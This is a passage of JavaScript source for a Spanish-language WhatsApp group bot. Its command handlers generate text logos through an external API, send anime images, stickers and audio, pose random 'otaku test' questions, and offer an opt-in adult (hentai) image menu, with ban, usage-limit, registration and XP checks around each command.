				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/create-science-fiction-text-effect-online-free-1038.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'romper': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/break-wall-text-effect-871.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'sangre': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/blood-text-on-the-frosted-glass-941.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'gameover': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				if (!UwU.includes('|')) return reply(`*[ ! ] Por favor agrege una barra en medio de 2 textos*\n" | "`)
				text1 = UwU.split("|")[0]
				text2 = UwU.split("|")[1]
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/video-game-classic-8-bit-text-effect-1037.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro2?apikey=${MyApiKey}&estilo=${tprolink}&text1=${text1}&text2=${text2}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'pornhub': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				if (!UwU.includes('|')) return reply(`*[ ! ] Por favor agrege una barra en medio de 2 textos*\n" | "`)
				text1 = UwU.split("|")[0]
				text2 = UwU.split("|")[1]
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/pornhub-style-logo-online-generator-free-977.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro2?apikey=${MyApiKey}&estilo=${tprolink}&text1=${text1}&text2=${text2}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'attp': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				let attexto = encodeURIComponent(UwU)
				try {
					var attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${attexto}`)
				} catch (e) {
					console.log(`Error fetch, comando: ${command}`)
				}
				try {
					var bas64 = `data:image/jpeg;base64,${attp2.toString('base64')}`
					var mantap = await convertSticker(bas64, `${pushname ? pushname : cocreador} & ${NameBot}`, `${groupName ? groupName : "NeKosmic"}`)
					var imageBuffer = new Buffer.from(mantap, 'base64');
					await teslagod.sendMessage(from, imageBuffer, sticker, {
						quoted: fakemek
					})
				} catch (e) {
					console.log(e)
					teslagod.sendMessage(from, attp2, sticker, {
						quoted: fakemek
					})
				}
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break

			//Comandos anime
			case 'mianime': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isAnime) return reply(`*[ ! ] El modo anime esta apagado*`)
				let animenu = `${monospace}[ ANIME-MENU ]${monospace}
 
╔═══════════
║圆 ${prefix}himnootaku
║圆 ${prefix}reconime
║圆 ${prefix}anifrase
║圆 ${prefix}waifu
║圆 ${prefix}waifuhd
║圆 ${prefix}facehd
║圆 ${prefix}aniwpp
║圆 ${prefix}neko
║圆 ${prefix}snime
║圆 ${prefix}otakutest
╚═══════════
`
				thumbNK(fs.readFileSync('./multimedia/imagenes/myanime.jpg'), animenu)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'himnotaku':
			case 'himnootaku': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isAnime) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				let TeslApi = fs.readFileSync(`./multimedia/sonidos/audiouwu/flp.m4a`)
				teslagod.updatePresence(from, Presence.recording)
				teslagod.sendMessage(from, TeslApi, audio, {
					mimetype: 'audio/mp4',
					quoted: fvn,
					ptt: true,
					contextInfo: {
						"externalAdReply": {
							"title": `${pushname} 🔊`,
							mediaType: 2,
							"thumbnail": fs.readFileSync('./multimedia/imagenes/DjbotHD.jpg'),
							"previewType": "VIDEO",
							"mediaUrl": `https://youtu.be/ed-6VSF-GGc`
						}
					}
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'reconime': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isAnime) return
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/reconime?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				await teslagod.sendMessage(from, fs.readFileSync('./multimedia/imagenes/anim_vers.jpg'), image, {
					quoted: fakemek,
					caption: TeslApi.textwa,
					sendEphemeral: true
				})
				console.log('⡏⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠉⠉⠉⠹\n⡇⢸⣿⡟⠛⢿⣷⠀⢸⣿⡟⠛⢿⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡇⠀⢸⣿⡇⠀\n⡇⢸⣿⣧⣤⣾⠿⠀⢸⣿⣇⣀⣸⡿⠃⢸⣿⡇⠀⢸⣿⡇⢸⣿⣇⣀⣸⣿⡇⠀\n⡇⢸⣿⡏⠉⢹⣿⡆⢸⣿⡟⠛⢻⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡏⠉⢹⣿⡇⠀\n⡇⢸⣿⣧⣤⣼⡿⠃⢸⣿⡇⠀⢸⣿⡇⠸⣿⣧⣤⣼⡿⠁⢸⣿⡇⠀⢸⣿⡇⠀\n⣇⣀⣀⣀⣀⣀⣀⣄⣀⣀⣀⣀⣀⣀⣀⣠⣀⡈⠉⣁⣀⣄⣀⣀⣀⣠⣀⣀⣀⣰\n⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷\n⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇\n⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽\n⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕\n⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕\n⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕\n⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄\n⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕\n⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿\n⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟\n⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠\n⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙\n⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣\n')
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'anifrase':
			case 'fraseani': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isAnime) return
				try {
					var rpt = await fetchJson(`https://latam-api.vercel.app/api/ani_frases?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				reply(`Anime : ${rpt.anime}\nPersonaje : ${rpt.personaje}\nFrase : ${rpt.frase}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'waifu':
			case 'waifus': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isAnime) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var dataimg = await fetchJson(`https://latam-api.vercel.app/api/waifu?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				var imgrpt = await getBuffer(dataimg.imagen)
				enviarIMG(imgrpt, fs.readFileSync('./multimedia/imagenes/myanime.jpg'), `┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'waifuhd':
			case 'hdwaifu': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isAnime) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var dataimg = await fetchJson(`https://latam-api.vercel.app/api/waifu_hd?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				var imgrpt = await getBuffer(dataimg.imagen)
				enviarIMG(imgrpt, fs.readFileSync('./multimedia/imagenes/myanime.jpg'), `┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'facehd':
			case 'hdface': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isAnime) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var dataimg = await fetchJson(`https://latam-api.vercel.app/api/rostro_4k?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				var imgrpt = await getBuffer(dataimg.imagen)
				enviarIMG(imgrpt, fs.readFileSync('./multimedia/imagenes/myanime.jpg'), `┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'aniwpp':
			case 'wppani': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isAnime) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var dataimg = await fetchJson(`https://latam-api.vercel.app/api/anime_wpp?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				var imgrpt = await getBuffer(dataimg.imagen)
				enviarIMG(imgrpt, fs.readFileSync('./multimedia/imagenes/myanime.jpg'), `┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'neko':
			case 'nekos': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isAnime) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var dataimg = await fetchJson(`https://latam-api.vercel.app/api/nekonime1?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				var imgrpt = await getBuffer(dataimg.imagen)
				enviarIMG(imgrpt, fs.readFileSync('./multimedia/imagenes/myanime.jpg'), `┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			/*case 'neko2': case 'nekos2': {
			if (isBaneado) return
			if (isLimit(sender)) return
			if (!isRegistro && !autonomo) return rgeply(regply)
			if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
			if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
			if (!isAnime) return
			procesando(`_Procesando, ${pushname} por favor espere..._`)
			try {
			var dataimg = await fetchJson(`https://latam-api.vercel.app/api/nekonime3?apikey=${MyApiKey}`)
			} catch (e) {
			reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
			console.log(`Error fetch, comando: ${command}`)
			}
			var imgrpt = await getBuffer(dataimg.imagen)
			enviarIMG(imgrpt,fs.readFileSync('./multimedia/imagenes/myanime.jpg'),`┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break*/
			case 'snime': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isAnime) return
				try {
					var datagif = await fetchJson(`https://latam-api.vercel.app/api/randgif_anime?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				var imgrpt = await getBuffer(datagif.gif)
				var encmedia = await teslagod.sendVideoAsSticker(from, imgrpt, fakemek, {
					packname: `${groupName}`,
					author: `${NameBot ? NameBot : "NK-BOT"}`
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'otakutest':
			case 'testotaku': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isAnime) return
				let testaku = ['sufriste bulling por ser otaku?', 'uwu?', 'sabes cantar algun opening?', 'te bañas?', 'eres social o antisocial?', 'imitas algun movimiento de un personaje anime?', 'algun anime que te que iso reir a mas no poder?', 'personaje mas kawaii que te guste?', 'te gustan las lolis?', 'conoces o viste algun cosplayer?', 'que es ser otaku para ti?', 'recomiendarias 5 animes, como cuales?', 'anime que no te gusta', 'anime que mas odias', 'poder que quisieras tener de un personaje anime', 'te gustaria vivir tu vida como en un anime? como cual?', 'personaje anime del cual estas enamod@?', 'si reencarnarias en un mundo anime cual seria?', 'sabes que significa onichan?', 'Has cantado alguna vez el opening de tu anime favorito?', 'genero que mas te gusta de anime?', 'haces dibujos o mangas?', 'openings que no dejas de escuchar', 'te gusta el h3nta1?', 'Sabes palabras en japonés?', 'Cada cuánto tiempo ves anime?', 'Vas o has ido a convenciones de anime y manga?', 'Qué animes ves o has visto recientemente?', 'Escuchas canciones/openings de tus series favoritas?', 'Cuántas series de anime as visto?', 'Te gustaría conocer a alguien que tengas las mismas cualidades que tu personaje de anime favorito?', 'Qué es ser otaku para ti?', 'Te iniciaste solo en esto o un amigo o familiar te inicio?', 'Cuál es el género que más te gusta?', 'anime con el cual lloraste?', 'nombre del autor de naruto?', 'nombre del autor de dragon ball?', 'lees algun manga? titulo?', 'estas atento a la salida de animes nuevos?', 'algun familiar sabe que eres otaku?', 'tus amigos saben que eres otaku?', 'tienes algun poster, almohada, juguete, decoraciones de un anime?', 'que te parecio el anime bocu no pico? si no lo viste te lo recomiendo!!!', 'te gusta el NTR?', 'viste un anime yaoi? name?', 'que haces si alguien habla mal de tu anime fav?', 'te regalan dinero para ver anime legal, seguirias viendolo de forma ilegal?', 'te gustaria vajar a japon? por que?', 'quien crees que sea mas fuerte goku o saitma?', 'que opinas de los animes clasicos|antiguos?', 'Como se llama el Hijo de Naruto según el manga?', 'primer anime que viste?', 'anime que viste y no te gusto?', 'animes que quieres ver y no has visto?', 'tu crush del anime?(waifu)(husbando)', 'pareja fovorita del anime k viste?', 'el mejor villano del anime?', 'mejor pelea del anime que viste?', 'escena mas triste que viste en un anime?', 'personaje del anime q es parecido a ti?', 'anime antiguo q para ti no pasa de moda?', 'mascotas|animales favoritos del anime?', 'anime q para ti tiene la mejor animación?', 'personaje(femenino) favorito segundario del anime?', 'personaje(femenino) principal favorito del anime?', 'personaje(masculino) principal favorito del anime?', 'personaje(masculino) favorito segundario del anime?', 'la escena mas épica del anime para ti?', 'personaje anime q te pone de nervios?', 'arma fovorita de un anime que viste?', 'la muerte mas trite del anime que viste?', 'la mejor pelea anime?', 'la escena mas genial del anime para t?', 'un anime q decearias q fuera real?', 'frase favorita de algun personaje del anime?', 'anime q decearias q nunca acabará?', 'name de tu anime favorito?']
				let brandom = testaku[Math.floor(Math.random() * (testaku.length))]
				let otest = `▪︎ ${senderNumber}\n▪︎ _*${brandom}*_ `
				reply(otest)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break

			//Menu H hentai
			case 'labiblia': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isNsfw) return reply(`El modo H esta apagado`)
				let hmenu = `${monospace}[ MENU +18 ]${monospace}
 
╔═══════════
║㋡ ${prefix}hentai
║㋡ ${prefix}hwaifu
║㋡ ${prefix}hneko
║㋡ ${prefix}traph
╚═══════════
`
				thumbNK(fs.readFileSync('./multimedia/imagenes/nsfw.jpg'), hmenu)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'hentai':
			case 'jentai': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isNsfw) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var dataimg = await fetchJson(`https://latam-api.vercel.app/api/hentai?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				var imgrpt = await getBuffer(dataimg.hidrogeno)
				enviarIMG(imgrpt, fs.readFileSync('./multimedia/imagenes/nsfw.jpg'), `┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'hwaifu':
			case 'waifuh': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isNsfw) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var dataimg = await fetchJson(`https://latam-api.vercel.app/api/waifu_h?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				var imgrpt = await getBuffer(dataimg.hidrogeno)
				enviarIMG(imgrpt, fs.readFileSync('./multimedia/imagenes/nsfw.jpg'), `┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'hneko':
			case 'nekoh': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isNsfw) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var dataimg = await fetchJson(`https://latam-api.vercel.app/api/neko_h?apikey=${MyApiKey}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				var imgrpt = await getBuffer(dataimg.hidrogeno)
				enviarIMG(imgrpt, fs.readFileSync('./multimedia/imagenes/nsfw.jpg'), `┏━━⊱ Imagen : ${command}\n┣━⊱ Solicitada por : ${senderNumber}\n┗⊱ Fecha : ${fechaCompleta}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'traph':
			case 'htrap': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isNsfw) return
